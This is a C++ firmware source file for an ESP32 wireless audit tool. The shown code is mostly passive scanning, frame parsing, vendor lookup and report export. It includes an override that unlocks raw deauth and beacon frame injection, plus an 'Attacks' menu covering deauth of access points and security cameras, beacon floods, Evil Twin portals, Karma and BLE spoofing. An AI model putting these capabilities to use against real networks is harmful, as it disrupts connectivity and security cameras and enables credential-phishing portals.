#include "RadioAuditActivity.h"

#include <ESPmDNS.h>
#include <GfxRenderer.h>
#include <HalClock.h>
#include <HalStorage.h>
#include <Logging.h>
#include <Memory.h>
#include <WiFiClient.h>
#include <WiFiUdp.h>
#include <esp_random.h>
#include <esp_timer.h>
#include <esp_wifi.h>
#include <lwip/etharp.h>
#include <lwip/ip_addr.h>
#include <lwip/netif.h>
#include <lwip/tcpip.h>
#include <ping/ping_sock.h>

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <vector>

#include "MappedInputManager.h"
#include "RadioAuditHelpers.h"
#include "activities/home/FileBrowserActivity.h"
#include "activities/network/WifiSelectionActivity.h"
#include "activities/util/ConfirmationActivity.h"
#include "activities/util/KeyboardEntryActivity.h"
#include "activities/util/WebReportActivity.h"
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
#include "activities/util/EvilTwinActivity.h"
#endif
#include "RadioInkSettings.h"
#include "components/UITheme.h"
#include "fontIds.h"
#include "images/RadioInkSkull.h"

using namespace ra;  // pull the extracted stateless helpers in unqualified

#if defined(RADIO_AUDIT_ENABLE_BLE)
#include <BLEAdvertising.h>
#include <BLEClient.h>
#include <BLERemoteCharacteristic.h>
#include <BLERemoteService.h>

#include <map>
#endif

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
// The IDF rejects raw deauth/disassoc/beacon frames sent via esp_wifi_80211_tx
// unless this weak sanity-check hook is overridden. Compiled in only for active
// builds (authorized testing). If a future IDF renames the symbol, adjust here.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }
#endif

namespace {
using Action = RadioAuditActivity::Action;
constexpr int ACTION_COUNT = static_cast<int>(Action::COUNT);

// Leaf action labels, indexed by the Action enum value (order must match).
constexpr const char* ACTION_LABELS[ACTION_COUNT] = {
    "Quick Scan",       "Deep Scan",        "WiFi Scan",         "BLE Scan",           "Client Recon (probes)",
    "Channel usage",    "Audit Findings",   "View WiFi results", "View BLE results",   "Camera Sweep",
    "Save text report", "Save CSV report",  "Save JSON report",  "Save WiGLE CSV",     "Live PCAP capture",
    "Handshake/PMKID",  "Deauth (all APs)", "Deauth selected",   "Beacon flood",       "Evil Twin / Portal",
    "Tracker Sweep",    "Deauth Detector",  "BLE Spoof",         "Karma / Probe Resp", "Deauth Cameras",
    "Threat Sweep",     "Anti-Stalk Watch", "Drone RID Scan",    "View Reports",       "Share Findings (web)",
    "Guardian Mode",    "Scheduled Log",    "About Radio Ink",   "mDNS Browser",       "LAN Scanner",
    "NTP Time Sync",    "Network Info",     "Port Probe",        "Subnet Calculator",  "Traceroute",
    "Rogue DHCP Probe", "SNMP Sweep",       "WPS Audit",         "System Stats",       "I2C Scan"};

const char* actionLabel(Action a) { return ACTION_LABELS[static_cast<int>(a)]; }

UIIcon actionIcon(Action a) {
  switch (a) {
    case Action::ExportText:
    case Action::ExportCsv:
    case Action::ExportJson:
    case Action::ExportWigle:
      return UIIcon::File;
    default:
      return UIIcon::Wifi;
  }
}

// Menu categories, each grouping a set of leaf actions. To extend the tool, add
// a category here (and a case in runAction()) — the menu nav/render adapt
// automatically from these tables.
struct ActionCategory {
  const char* name;
  const Action* items;
  int count;
  UIIcon icon;
};
// Category item lists, grouped by intent. CAT_ENTRY derives the count from the
// array so it can never drift out of sync when items are added/removed.
#define CAT_ENTRY(name, arr, icon) {name, arr, static_cast<int>(sizeof(arr) / sizeof((arr)[0])), icon}

// Scan: enumerate what's around.
constexpr Action CAT_SCAN_ITEMS[] = {Action::QuickScan, Action::DeepScan,    Action::WifiScan,
                                     Action::BleScan,   Action::ClientRecon, Action::ChannelUsage};
// Network: L3 reconnaissance that requires associating to an AP first (except
// Subnet Calculator, which is a pure offline calculator).
constexpr Action CAT_NETWORK_ITEMS[] = {Action::MdnsBrowse, Action::LanScan,   Action::NtpSync,
                                        Action::NetInfo,    Action::PortProbe, Action::SubnetCalc,
                                        Action::Traceroute, Action::DhcpProbe, Action::SnmpSweep};
// Detect: passive threat / signature monitors.
constexpr Action CAT_DETECT_ITEMS[] = {Action::Guardian,      Action::ThreatSweep, Action::CameraSweep,
                                       Action::TrackerSweep,  Action::AntiStalk,   Action::DroneScan,
                                       Action::DeauthDetector};
// Capture: stream to SD.
constexpr Action CAT_CAPTURE_ITEMS[] = {Action::CapturePcap, Action::CaptureHandshake, Action::ScheduledLog};
// Results: review on-device.
constexpr Action CAT_RESULTS_ITEMS[] = {Action::AuditFindings, Action::WifiResults,  Action::BleResults,
                                        Action::WpsAudit,      Action::ReportViewer, Action::ShareWeb,
                                        Action::SystemStats,   Action::I2cScan};
// Export: save reports to SD.
constexpr Action CAT_EXPORT_ITEMS[] = {Action::ExportText, Action::ExportCsv, Action::ExportJson, Action::ExportWigle};
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
// Attacks: active/transmitting, dev builds only.
constexpr Action CAT_ATTACK_ITEMS[] = {Action::DeauthAttack, Action::DeauthSelected, Action::DeauthCameras,
                                       Action::BeaconFlood,  Action::EvilTwin,       Action::Karma,
                                       Action::BleSpoof};
#endif
constexpr ActionCategory ACTION_CATEGORIES[] = {
    CAT_ENTRY("Scan", CAT_SCAN_ITEMS, UIIcon::Wifi),
    CAT_ENTRY("Network", CAT_NETWORK_ITEMS, UIIcon::Hotspot),
    CAT_ENTRY("Detect", CAT_DETECT_ITEMS, UIIcon::Bookmark),
    CAT_ENTRY("Capture", CAT_CAPTURE_ITEMS, UIIcon::Transfer),
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
    CAT_ENTRY("Attacks", CAT_ATTACK_ITEMS, UIIcon::Hotspot),
#endif
    CAT_ENTRY("Results", CAT_RESULTS_ITEMS, UIIcon::Library),
    CAT_ENTRY("Export", CAT_EXPORT_ITEMS, UIIcon::Folder),  // File has no 32px glyph; Folder = save-to-SD
};
constexpr int CATEGORY_COUNT = sizeof(ACTION_CATEGORIES) / sizeof(ACTION_CATEGORIES[0]);

// mDNS service types the browser enumerates, one per query pass. ESPmDNS prepends
// the leading underscore itself, so the bare label is fine. queryService() blocks
// ~3 s each (the IDF's fixed mdns_query_ptr timeout), so they run one-per-tick.
struct MdnsService {
  const char* svc;
  const char* proto;
  const char* label;
};
constexpr MdnsService MDNS_SERVICES[] = {
    {"http", "tcp", "HTTP"},        {"https", "tcp", "HTTPS"}, {"ipp", "tcp", "Printer"}, {"raop", "tcp", "AirPlay"},
    {"googlecast", "tcp", "Cast"},  {"rtsp", "tcp", "Camera"}, {"ssh", "tcp", "SSH"},     {"smb", "tcp", "SMB"},
    {"workstation", "tcp", "Host"}, {"hap", "tcp", "HomeKit"},
};
constexpr int MDNS_SERVICE_COUNT = sizeof(MDNS_SERVICES) / sizeof(MDNS_SERVICES[0]);
constexpr size_t MDNS_MAX_RESULTS = 48;  // cap discovered services (bounds DRAM)
constexpr int MDNS_MAX_TXT = 12;         // cap TXT records kept per service

constexpr int LAN_BATCH = 12;          // ARP who-has requests sent per loop tick
constexpr int LAN_DRAIN_TICKS = 6;     // extra ticks after the sweep to catch late replies
constexpr size_t LAN_MAX_HOSTS = 128;  // cap discovered hosts (bounds DRAM)

constexpr int QUICK_SCAN_PASSES = 1;
constexpr int DEEP_SCAN_PASSES = 3;
constexpr size_t MAX_WIFI_FINDINGS = 64;
constexpr size_t MAX_BLE_FINDINGS = 32;
// Heap floors for BLE. START is checked BEFORE BLEDevice::init (which itself
// eats ~65 KB for the controller). ABORT is checked between scan windows, so it
// must sit well below the *post-init* baseline (~25 KB free) or it trips before
// the first window ever runs -- only bail when heap is genuinely critical.
constexpr uint32_t BLE_HEAP_FLOOR_START = 50000;
constexpr uint32_t BLE_HEAP_FLOOR_ABORT = 9000;
// Tracker "play sound" GATT — three protocols, tried newest-first. A modern AirTag
// uses the cross-industry DULT (unwanted-tracker) service or the FMNA (Find My
// accessory) service; only older AirTags respond to the legacy 7DFC900x/0xAF write.
// Each control-point characteristic must be subscribed for indications/notifications
// before the sound command is written, and the connect must use the address TYPE seen
// in the advert.
//
// Attribution: this tracker "play sound" support is BASED ON the ESP32Marauder project
// by justcallmekoko (https://github.com/justcallmekoko/ESP32Marauder, GPL-3.0) — the
// three-protocol approach, the DULT/FMNA/legacy service & characteristic UUIDs, the
// command bytes, and the subscribe-before-write + observed-address-type requirements
// all come from studying that work. This is an independent reimplementation for Radio
// Ink's Bluedroid BLE stack (Marauder uses NimBLE); credit for the technique is his.
constexpr char DULT_SOUND_SERVICE[] = "15190001-12f4-c226-88ed-2ac5579f2a85";
constexpr char DULT_SOUND_CHAR[] = "8e0c0001-1d68-fb92-bf61-48377421680e";
constexpr uint8_t DULT_SOUND_START[] = {0x00, 0x03};
constexpr uint8_t DULT_SOUND_STOP[] = {0x01, 0x03};
constexpr char FMNA_SOUND_SERVICE[] = "0000fd44-0000-1000-8000-00805f9b34fb";
constexpr char FMNA_SOUND_CHAR[] = "4f860003-943b-49ef-bed4-2f730304427a";
constexpr uint8_t FMNA_SOUND_START[] = {0x01, 0x00, 0x03};
constexpr uint8_t FMNA_SOUND_STOP[] = {0x01, 0x01, 0x03};
constexpr char AIRTAG_SOUND_SERVICE[] = "7dfc9000-7d1c-4951-86aa-8d9728f8d66c";
constexpr char AIRTAG_SOUND_CHAR[] = "7dfc9001-7d1c-4951-86aa-8d9728f8d66c";
constexpr uint8_t AIRTAG_SOUND_START[] = {0xAF};
// BLE pairing-popup adverts seen in one sweep before we call it a spam flood.
// bleFindings is capped at MAX_BLE_FINDINGS (32), so during a real Flipper/app
// flood nearly every slot fills with pairing adverts; 8 is a safe trip point.
constexpr int BLE_SPAM_THRESHOLD = 8;
// Anti-Stalk Watch tuning.
constexpr uint32_t STALK_INTERVAL_MS = 12000;  // gap between BLE re-scan passes
constexpr int STALK_MAX = 24;                  // tracked devices (bounded)
constexpr int STALK_THRESHOLD = 3;             // passes seen before "following you"
constexpr int STALK_FORGET = 3;                // consecutive misses before eviction
// Guardian Mode tuning.
constexpr uint32_t GUARDIAN_INTERVAL_MS = 2000;       // gap between monitor rounds
constexpr uint32_t GUARDIAN_DEAUTH_WINDOW_MS = 2500;  // promiscuous deauth-flood listen per round
// Scheduled Log setup presets, chosen on the setup form.
constexpr int LOG_INTERVAL_SECS[] = {15, 30, 60, 300, 600};
constexpr const char* LOG_INTERVAL_LABELS[] = {"15 seconds", "30 seconds", "1 minute", "5 minutes", "10 minutes"};
constexpr int LOG_INTERVAL_COUNT = sizeof(LOG_INTERVAL_SECS) / sizeof(LOG_INTERVAL_SECS[0]);
constexpr uint32_t LOG_DURATION_SECS[] = {0, 900, 3600, 14400, 28800};  // 0 = until stopped
constexpr const char* LOG_DURATION_LABELS[] = {"Until stopped", "15 minutes", "1 hour", "4 hours", "8 hours"};
constexpr int LOG_DURATION_COUNT = sizeof(LOG_DURATION_SECS) / sizeof(LOG_DURATION_SECS[0]);
constexpr const char* LOG_RADIO_LABELS[] = {"WiFi + BLE", "WiFi only", "BLE only"};
constexpr int LOG_RADIO_COUNT = 3;
constexpr int LOG_SETUP_FIELDS = 3;
constexpr const char* AUDIT_DIR = "/.radioink/radio_ink";
constexpr const char* TEXT_EXPORT_PATH = "/.radioink/radio_ink/latest.txt";
constexpr const char* CSV_EXPORT_PATH = "/.radioink/radio_ink/latest.csv";
constexpr const char* JSON_EXPORT_PATH = "/.radioink/radio_ink/latest.json";
constexpr const char* WIGLE_EXPORT_PATH = "/.radioink/radio_ink/latest.wigle.csv";
// Optional "lat,lon" the user drops on the SD card; stamped into WiGLE rows.
// X4 has no GPS, so rows are 0,0 (WiGLE rejects null-island) unless this exists.
constexpr const char* LOCATION_PATH = "/.radioink/radio_ink/location.txt";
constexpr const char* WATCHLIST_PATH = "/.radioink/radio_ink/watchlist.txt";
constexpr const char* SNAPSHOT_PATH = "/.radioink/radio_ink/last_scan.txt";

// ---- SD-resident OUI -> vendor database (generated by scripts/gen_oui.py) ----
// The full IEEE registry (~39.5k vendors) lives on the SD card, not in flash, to
// keep ~660 KB off the app partition. macVendor() binary-searches it by seeking.
// Format: 'OUIB' magic + uint32 count, then `count` 32-byte records sorted by
// oui ascending (uint32 LE oui + 28-byte NUL-padded name). See gen_oui.py.
// Candidate paths are listed in ouiOpen().
constexpr size_t OUI_HEADER_SIZE = 8;
constexpr size_t OUI_NAME_FIELD = 28;
constexpr size_t OUI_RECORD_SIZE = 4 + OUI_NAME_FIELD;  // 32 bytes
constexpr int OUI_CACHE_SIZE = 24;                      // recent lookups (hits + misses)

HalFile g_ouiFile;        // open for the activity lifetime (onEnter..onExit)
uint32_t g_ouiCount = 0;  // record count from the file header, 0 if unavailable

struct OuiCacheEntry {
  uint32_t oui;
  bool valid;
  char name[OUI_NAME_FIELD];  // "" = known-miss (avoids re-searching unknown OUIs)
};
OuiCacheEntry g_ouiCache[OUI_CACHE_SIZE] = {};
int g_ouiCacheNext = 0;

// Open the SD OUI database and read its header. Missing/invalid file -> count 0
// (macVendor then returns "" for everything, same as before the DB existed).
void ouiOpen() {
  g_ouiCount = 0;
  for (auto& e : g_ouiCache) e.valid = false;
  g_ouiCacheNext = 0;

  // Look in the intended spot and the common places a user might drop the file
  // (SD root, the reports subdir) so vendor lookups work wherever it landed.
  static const char* const kCandidates[] = {
      "/.radioink/oui.bin",
      "/oui.bin",
      "/.radioink/radio_ink/oui.bin",
      "/oui.BIN",
  };
  const char* path = nullptr;
  for (const char* c : kCandidates) {
    if (Storage.exists(c)) {
      path = c;
      break;
    }
  }
  if (!path) {
    LOG_ERR("RADIO", "OUI db not found on SD (looked in /.radioink/oui.bin, /oui.bin, ...); vendor names off");
    return;
  }
  if (!Storage.openFileForRead("RADIO", path, g_ouiFile)) {
    LOG_ERR("RADIO", "OUI db found but open failed: %s", path);
    return;
  }
  uint8_t hdr[OUI_HEADER_SIZE];
  const int got = g_ouiFile.read(hdr, OUI_HEADER_SIZE);
  if (got != static_cast<int>(OUI_HEADER_SIZE) || memcmp(hdr, "OUIB", 4) != 0) {
    LOG_ERR("RADIO", "OUI db header bad at %s (read %d bytes, magic %02X %02X %02X %02X)", path, got, hdr[0], hdr[1],
            hdr[2], hdr[3]);
    g_ouiFile.close();
    return;
  }
  memcpy(&g_ouiCount, hdr + 4, 4);  // little-endian
  LOG_INF("RADIO", "OUI db loaded from %s: %u vendors", path, static_cast<unsigned>(g_ouiCount));
}

void ouiClose() {
  if (g_ouiFile.isOpen()) g_ouiFile.close();
  g_ouiCount = 0;
}

// ---- SD-resident BLE company-id -> vendor database (scripts/gen_ble_companies.py) ----
// Same seek-and-binary-search approach as the OUI db; kept off flash. Records are
// 'BLEC' magic + uint32 count, then 32-byte records sorted by id ascending:
// uint16 id + uint16 pad + 28-byte NUL-padded name. Absent file -> count 0 (the
// built-in vendor set in ra::bleCompany still applies).
constexpr size_t BLECOMP_HEADER_SIZE = 8;
constexpr size_t BLECOMP_NAME_FIELD = 28;
constexpr size_t BLECOMP_RECORD_SIZE = 4 + BLECOMP_NAME_FIELD;  // 32 bytes
constexpr int BLECOMP_CACHE_SIZE = 16;

HalFile g_bleCompFile;
uint32_t g_bleCompCount = 0;

struct BleCompCacheEntry {
  uint16_t id;
  bool valid;
  char name[BLECOMP_NAME_FIELD];  // "" = known-miss
};
BleCompCacheEntry g_bleCompCache[BLECOMP_CACHE_SIZE] = {};
int g_bleCompCacheNext = 0;

void bleCompOpen() {
  g_bleCompCount = 0;
  for (auto& e : g_bleCompCache) e.valid = false;
  g_bleCompCacheNext = 0;

  static const char* const kCandidates[] = {
      "/.radioink/ble_companies.bin",
      "/ble_companies.bin",
      "/.radioink/radio_ink/ble_companies.bin",
  };
  const char* path = nullptr;
  for (const char* c : kCandidates) {
    if (Storage.exists(c)) {
      path = c;
      break;
    }
  }
  if (!path) {
    LOG_INF("RADIO", "BLE company db not on SD; built-in vendor set only");
    return;
  }
  if (!Storage.openFileForRead("RADIO", path, g_bleCompFile)) {
    LOG_ERR("RADIO", "BLE company db open failed: %s", path);
    return;
  }
  uint8_t hdr[BLECOMP_HEADER_SIZE];
  const int got = g_bleCompFile.read(hdr, BLECOMP_HEADER_SIZE);
  if (got != static_cast<int>(BLECOMP_HEADER_SIZE) || memcmp(hdr, "BLEC", 4) != 0) {
    LOG_ERR("RADIO", "BLE company db header bad at %s", path);
    g_bleCompFile.close();
    return;
  }
  memcpy(&g_bleCompCount, hdr + 4, 4);  // little-endian
  LOG_INF("RADIO", "BLE company db loaded from %s: %u companies", path, static_cast<unsigned>(g_bleCompCount));
}

void bleCompClose() {
  if (g_bleCompFile.isOpen()) g_bleCompFile.close();
  g_bleCompCount = 0;
}

String hexEncode(const String& bytes) {
  static constexpr char hex[] = "0123456789ABCDEF";
  String out;
  out.reserve(bytes.length() * 2);
  for (size_t i = 0; i < bytes.length(); i++) {
    const uint8_t b = static_cast<uint8_t>(bytes[i]);
    out += hex[(b >> 4) & 0x0F];
    out += hex[b & 0x0F];
  }
  return out;
}

// ---- Per-target Wi-Fi deep scan (promiscuous capture) ----
constexpr int TARGET_WIFI_DEEP_MS = 6000;
constexpr int TARGET_MAX_CLIENTS = 24;

struct WifiTargetCapture {
  uint8_t bssid[6];
  volatile bool active;
  volatile uint16_t beaconCount;
  volatile uint16_t mgmtFrames;
  volatile uint16_t dataFrames;
  volatile uint16_t deauthFrames;
  volatile uint16_t disassocFrames;
  volatile long rssiSum;
  volatile int rssiMin;
  volatile int rssiMax;
  volatile uint16_t rssiSamples;
  uint8_t clients[TARGET_MAX_CLIENTS][6];
  volatile uint8_t clientCount;
  volatile bool privacy;
  volatile bool pmf;
  volatile bool wps;
};
WifiTargetCapture g_targetCap;

void targetAddClient(const uint8_t* mac) {
  if (macIsGroup(mac)) return;
  if (macEq(mac, g_targetCap.bssid)) return;
  for (uint8_t i = 0; i < g_targetCap.clientCount; i++)
    if (macEq(g_targetCap.clients[i], mac)) return;
  if (g_targetCap.clientCount < TARGET_MAX_CLIENTS) {
    memcpy(g_targetCap.clients[g_targetCap.clientCount], mac, 6);
    g_targetCap.clientCount++;
  }
}

// Parsed 802.11 frame from the promiscuous radio, with the trailing FCS already
// stripped. Shared preamble for the management-frame callbacks below.
struct PromiscFrame {
  const uint8_t* p;
  int len;          // payload length minus the 4-byte FCS the radio appends
  uint8_t ftype;    // frame type (0 = management)
  uint8_t fsub;     // frame subtype
  int8_t rssi;      // receive signal strength
  uint8_t channel;  // channel the frame was captured on
};

// Returns false if the frame is too short to hold an 802.11 header + FCS.
inline bool parsePromiscFrame(const void* buf, PromiscFrame& f) {
  const wifi_promiscuous_pkt_t* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  int len = pkt->rx_ctrl.sig_len;
  if (len < 28) return false;  // 24-byte header + 4-byte FCS minimum
  len -= 4;                    // strip trailing FCS
  f.p = pkt->payload;
  f.len = len;
  f.ftype = (f.p[0] >> 2) & 0x03;
  f.fsub = (f.p[0] >> 4) & 0x0F;
  f.rssi = static_cast<int8_t>(pkt->rx_ctrl.rssi);
  f.channel = pkt->rx_ctrl.channel;
  return true;
}

void targetPromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_targetCap.active) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const int len = fr.len;
  const uint8_t ftype = fr.ftype;
  const uint8_t fsub = fr.fsub;
  const uint8_t flags = p[1];
  const bool toDS = flags & 0x01;
  const bool fromDS = flags & 0x02;
  const uint8_t* a1 = p + 4;
  const uint8_t* a2 = p + 10;
  const uint8_t* a3 = p + 16;

  if (!macEq(a1, g_targetCap.bssid) && !macEq(a2, g_targetCap.bssid) && !macEq(a3, g_targetCap.bssid)) return;

  // RSSI is only meaningful from frames the AP itself transmitted (addr2 == BSSID).
  if (macEq(a2, g_targetCap.bssid)) {
    const int rssi = fr.rssi;
    g_targetCap.rssiSum += rssi;
    if (g_targetCap.rssiSamples == 0) {
      g_targetCap.rssiMin = rssi;
      g_targetCap.rssiMax = rssi;
    } else {
      if (rssi < g_targetCap.rssiMin) g_targetCap.rssiMin = rssi;
      if (rssi > g_targetCap.rssiMax) g_targetCap.rssiMax = rssi;
    }
    g_targetCap.rssiSamples++;
  }

  if (ftype == 0) {  // management
    g_targetCap.mgmtFrames++;
    if (fsub == 12)
      g_targetCap.deauthFrames++;  // deauthentication
    else if (fsub == 10)
      g_targetCap.disassocFrames++;  // disassociation
    if (fsub == 8 || fsub == 5) {    // beacon or probe response
      g_targetCap.beaconCount++;
      if (len >= 24 + 12) {
        const uint16_t cap = p[24 + 10] | (p[24 + 11] << 8);
        if (cap & 0x0010) g_targetCap.privacy = true;  // Privacy bit
        uint16_t idx = 24 + 12;                        // skip fixed params
        while (idx + 2 <= len) {
          const uint8_t tag = p[idx];
          const uint8_t tlen = p[idx + 1];
          if (idx + 2 + tlen > len) break;
          const uint8_t* d = p + idx + 2;
          if (tag == 48) {              // RSN IE -> walk to RSN capabilities for MFP bits
            uint16_t o = 2;             // version
            if (o + 4 <= tlen) o += 4;  // group cipher
            if (o + 2 <= tlen) {
              uint16_t c = d[o] | (d[o + 1] << 8);
              o += 2 + 4 * c;
            }  // pairwise
            if (o + 2 <= tlen) {
              uint16_t c = d[o] | (d[o + 1] << 8);
              o += 2 + 4 * c;
            }  // akm
            if (o + 2 <= tlen) {
              const uint16_t rsncap = d[o] | (d[o + 1] << 8);
              if (rsncap & 0x00C0) g_targetCap.pmf = true;  // MFPC/MFPR
            }
          } else if (tag == 221 && tlen >= 4) {  // vendor specific
            if (d[0] == 0x00 && d[1] == 0x50 && d[2] == 0xF2 && d[3] == 0x04) g_targetCap.wps = true;
          }
          idx += 2 + tlen;
        }
      }
    }
    targetAddClient(macEq(a1, g_targetCap.bssid) ? a2 : a1);
  } else if (ftype == 2) {  // data
    g_targetCap.dataFrames++;
    if (toDS && !fromDS)
      targetAddClient(a2);
    else if (!toDS && fromDS)
      targetAddClient(a1);
    else {
      targetAddClient(a1);
      targetAddClient(a2);
    }
  }
}

// Reads HH:MM:SS UTC straight from the DS3231 (X3 only). Returns "" if no RTC.
std::string clockStampUtc() {
  if (!halClock.isAvailable()) return "";
  Wire.beginTransmission(I2C_ADDR_DS3231);
  Wire.write(DS3231_SEC_REG);
  if (Wire.endTransmission(false) != 0) return "";
  Wire.requestFrom(static_cast<uint8_t>(I2C_ADDR_DS3231), static_cast<uint8_t>(3));
  if (Wire.available() < 3) return "";
  const uint8_t rawSec = Wire.read();
  const uint8_t rawMin = Wire.read();
  const uint8_t rawHour = Wire.read();
  const uint8_t sec = ((rawSec >> 4) & 0x07) * 10 + (rawSec & 0x0F);
  const uint8_t min = ((rawMin >> 4) & 0x07) * 10 + (rawMin & 0x0F);
  uint8_t hour;
  if (rawHour & 0x40) {  // 12h mode
    uint8_t h12 = ((rawHour >> 4) & 0x01) * 10 + (rawHour & 0x0F);
    const bool pm = rawHour & 0x20;
    if (h12 == 12) h12 = 0;
    hour = pm ? h12 + 12 : h12;
  } else {  // 24h mode
    hour = ((rawHour >> 4) & 0x03) * 10 + (rawHour & 0x0F);
  }
  char buf[16];
  snprintf(buf, sizeof(buf), "%02u:%02u:%02uZ", hour, min, sec);
  return std::string(buf);
}

// Best available stamp: RTC time of day, else device uptime.
std::string timeStamp() {
  const std::string t = clockStampUtc();
  if (!t.empty()) return t;
  return std::string("uptime ") + std::to_string(millis() / 1000) + "s";
}

// "YYYY-MM-DD HH:MM:SS" for the WiGLE FirstSeen column. The X4 has no dated RTC,
// so the date is a fixed placeholder; the time is RTC time-of-day when available
// (clockStampUtc -> "HH:MM:SSZ"), else derived from uptime. Format is what
// matters here -- absolute time is meaningless without a real clock + GPS.
std::string wigleTimestamp() {
  char buf[24];
  const std::string t = clockStampUtc();  // "HH:MM:SSZ" or ""
  if (t.size() >= 8) {
    snprintf(buf, sizeof(buf), "2020-01-01 %.8s", t.c_str());  // drops trailing 'Z'
  } else {
    const uint32_t s = millis() / 1000;
    snprintf(buf, sizeof(buf), "2020-01-01 %02u:%02u:%02u", (s / 3600) % 24, (s / 60) % 60, s % 60);
  }
  return std::string(buf);
}

// WiGLE encodes 802.11 capabilities in brackets. Map our short auth name to the
// closest bracketed token set so the CSV imports cleanly.
std::string wigleAuth(const std::string& auth) {
  if (auth == "OPEN") return "[ESS]";
  if (auth == "WEP") return "[WEP][ESS]";
  if (auth == "WPA") return "[WPA-PSK-TKIP][ESS]";
  if (auth == "WPA2") return "[WPA2-PSK-CCMP][ESS]";
  if (auth == "WPA/WPA2") return "[WPA-PSK-TKIP][WPA2-PSK-CCMP][ESS]";
  if (auth == "WPA2-EAP") return "[WPA2-EAP-CCMP][ESS]";
  if (auth == "WPA3") return "[WPA3-SAE-CCMP][ESS]";
  if (auth == "WPA2/WPA3") return "[WPA2-PSK-CCMP][WPA3-SAE-CCMP][ESS]";
  return std::string("[") + auth + "][ESS]";
}

// ---- Probe-request harvesting (channel-hopping promiscuous capture) ----
constexpr int PROBE_MAX = 48;

std::string probeSsidLabel(const std::string& ssid) { return ssid.empty() ? std::string("(broadcast)") : ssid; }

struct ProbeCapture {
  volatile bool active;
  struct Row {
    uint8_t mac[6];
    char ssid[33];
    int8_t rssi;
  };
  Row rows[PROBE_MAX];
  volatile uint8_t count;
};
std::unique_ptr<ProbeCapture> g_probeCap;  // allocated only during a probe scan

void probePromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_probeCap || !g_probeCap->active) return;
  if (type != WIFI_PKT_MGMT) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const int len = fr.len;
  const uint8_t ftype = fr.ftype;
  const uint8_t fsub = fr.fsub;
  if (ftype != 0 || fsub != 4) return;  // probe request only
  const uint8_t* sa = p + 10;           // addr2 = source (client)
  if (sa[0] & 0x01) return;             // ignore group source addresses

  char ssid[33];
  ssid[0] = '\0';
  if (len >= 24 + 2) {  // SSID IE (tag 0) is first tagged param in the body
    const uint8_t tag = p[24];
    const uint8_t tlen = p[24 + 1];
    if (tag == 0 && tlen > 0 && 24 + 2 + tlen <= len) {
      const uint8_t n = tlen > 32 ? 32 : tlen;
      memcpy(ssid, p + 24 + 2, n);
      ssid[n] = '\0';
    }
  }

  for (uint8_t i = 0; i < g_probeCap->count; i++)
    if (macEq(g_probeCap->rows[i].mac, sa) && strcmp(g_probeCap->rows[i].ssid, ssid) == 0) return;
  if (g_probeCap->count < PROBE_MAX) {
    memcpy(g_probeCap->rows[g_probeCap->count].mac, sa, 6);
    memcpy(g_probeCap->rows[g_probeCap->count].ssid, ssid, sizeof(ssid));
    g_probeCap->rows[g_probeCap->count].rssi = fr.rssi;
    g_probeCap->count++;
  }
}

// ---- Associated-client capture (camera sweep) ----
// Ring/Blink cameras join the home network as stations, not APs, so a beacon
// scan never sees them. This grabs the station MAC from data frames so we can
// match it against camera-vendor OUIs.
constexpr int CLIENT_MAX = 64;
struct ClientCapture {
  volatile bool active;
  struct Row {
    uint8_t mac[6];
    uint8_t bssid[6];  // the AP this station is associated to (for directed deauth)
    int8_t rssi;
    uint8_t channel;  // channel the station was heard on (for locate/deauth)
  };
  Row rows[CLIENT_MAX];
  volatile uint8_t count;
  volatile uint32_t framesSeen;  // total DATA frames the radio delivered (diagnostic)
};
std::unique_ptr<ClientCapture> g_clientCap;  // allocated only during a camera sweep

void clientPromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_clientCap || !g_clientCap->active) return;
  if (type != WIFI_PKT_DATA) return;
  g_clientCap->framesSeen++;
  const wifi_promiscuous_pkt_t* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* p = pkt->payload;
  if (pkt->rx_ctrl.sig_len < 24) return;

  const bool toDS = p[1] & 0x01;
  const bool fromDS = p[1] & 0x02;
  const uint8_t* sta = nullptr;
  const uint8_t* bssid = nullptr;
  if (toDS && !fromDS) {  // STA -> AP: addr2 station, addr1 BSSID
    sta = p + 10;
    bssid = p + 4;
  } else if (fromDS && !toDS) {  // AP -> STA: addr1 station, addr2 BSSID
    sta = p + 4;
    bssid = p + 10;
  } else {
    return;  // WDS / ad-hoc: skip
  }
  if (sta[0] & 0x01) return;  // skip group/broadcast addresses

  for (uint8_t i = 0; i < g_clientCap->count; i++)
    if (macEq(g_clientCap->rows[i].mac, sta)) return;
  if (g_clientCap->count < CLIENT_MAX) {
    memcpy(g_clientCap->rows[g_clientCap->count].mac, sta, 6);
    memcpy(g_clientCap->rows[g_clientCap->count].bssid, bssid, 6);
    g_clientCap->rows[g_clientCap->count].rssi = static_cast<int8_t>(pkt->rx_ctrl.rssi);
    g_clientCap->rows[g_clientCap->count].channel = pkt->rx_ctrl.channel;
    g_clientCap->count++;
  }
}

// ---- Live PCAP capture (promiscuous frames -> SD card) ----
// Single-producer / single-consumer byte ring: the Wi-Fi promiscuous callback
// (producer) appends pcap records; the activity loop (consumer) drains them to
// SD. Decoupling is required because the callback runs in Wi-Fi-driver context
// where SD I/O is unsafe. Static DRAM (no heap), power-of-two size for cheap
// masking. ~32 KB cushions the slow e-ink redraw window against drops.
constexpr const char* CAPTURE_DIR = "/.radioink/captures";
constexpr uint32_t PCAP_RING_SIZE = 32768;  // 2^15, must stay a power of two
constexpr uint32_t PCAP_RING_MASK = PCAP_RING_SIZE - 1;
constexpr uint32_t PCAP_SNAPLEN = 2304;      // max 802.11 MTU we record per frame
constexpr uint32_t PCAP_LINKTYPE = 105;      // LINKTYPE_IEEE802_11 (raw frames)
